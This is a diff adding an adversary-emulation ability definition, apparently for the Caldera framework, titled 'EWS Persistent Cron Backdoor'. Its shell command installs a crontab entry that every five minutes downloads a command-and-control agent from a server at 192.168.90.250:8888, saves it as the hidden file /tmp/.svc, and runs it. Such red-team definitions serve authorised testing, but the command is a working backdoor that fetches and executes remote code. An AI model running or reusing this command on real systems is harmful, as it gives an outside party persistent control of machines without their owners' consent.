@@ -1,0 +1,18 @@
+---
+
+- id: e5f6a7b8-5555-5555-5555-000000000007
+  name: EWS Persistent Cron Backdoor
+  description: Cron job re-establishes C2 agent every 5 minutes
+  tactic: persistence
+  technique_id: T0889
+  technique_name: Modify Program
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      (crontab -l 2>/dev/null; echo "*/5 * * * * cd /tmp &&
+      curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux'
+      http://192.168.90.250:8888/file/download -o .svc &&
+      chmod +x .svc && ./.svc -server http://192.168.90.250:8888
+      -group ews &") | crontab - &&
+      echo "PERSISTENCE_INSTALLED"
